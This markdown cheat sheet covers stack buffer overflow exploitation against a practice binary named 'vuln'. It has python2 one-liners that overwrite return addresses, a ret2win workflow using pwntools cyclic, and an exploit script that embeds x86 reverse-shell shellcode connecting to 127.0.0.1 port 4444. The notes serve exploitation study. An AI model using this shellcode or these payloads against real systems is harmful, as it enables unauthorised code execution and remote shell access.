# Stack Based Buffer Overflows

## Basics

Look for dangerous methods such as "gets()"  
- These do not check the length of the input and simply retreive all that is given  

## Passing Input

If input is retreived after the program has started:  

```bash
python2 -c 'print("A"*64 + "\x9d\x06\x40\x00\x00\x00\x00\x00")' | ./vuln
```

If the input needs to be provided as a commandline arg, place it in backticks (\`):  

```bash
./vuln `python2 -c 'print("A"*64 + "\x9d\x06\x40\x00\x00\x00\x00\x00")'`
```

## Environment Variables

If environment variables are pulled into the binary, you can set variables to print shellcode  

```bash
export EnvVar=`python2 -c 'print("A"*64 + "\xef\xbe\xad\xde")'`
./vuln
```

## RET2WIN (w/out ASLR or PIE)

1. Find the number of chars to overwrite the return address

```bash
# sudo apt install python3-pwntools
cyclic 100
```

2. Supply the above output to the appropriate input
3. In a debugger or from the terminal output, take the supplied return address, convert it to ascii and reverse it
4. Supply this value back to `cyclic`

```bash
cyclic -l waaa
```

5. Use `objdump` or a debugger to find the WIN address

```bash
objdump -d vuln
# or in GDB
i functions
```

6. Send the payload

```bash
python2 -c 'print("A"*88 + "\xef\xbe\xad\xde")' | ./vuln
```

## Shellcode Injection

1. Find the number of chars to overwrite the return address

```bash
# sudo apt install python3-pwntools
cyclic 100
```

2. Supply the above output to the appropriate input
3. In a debugger or from the terminal output, take the supplied return address, convert it to ascii and reverse it
4. Supply this value back to `cyclic`

```bash
cyclic -l waaa
```

5. User `ropper` to find gadgets to return you to your shellcode, or manually select a return address that is inside a nopsled
6. Create shellcode and create an exploit script

```python
offset = 140

nopsled = "\x90" * 15

buf =  b""
buf += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0"
buf += b"\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9"
buf += b"\x68\x7f\x00\x00\x01\x68\x02\x00\x11\x5c\x89\xe1"
buf += b"\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52"
buf += b"\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
buf += b"\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

junk = "\x90" * (offset - (len(nopsled) + len(buf) ))

ret_addr = "\x50\x83\x04\x08"       # 0x08048350: call eax;

print(nopsled + buf + junk + ret_addr)
```

7. Send the output to the vulnerable program

`python2 exploit.py | ./vuln`






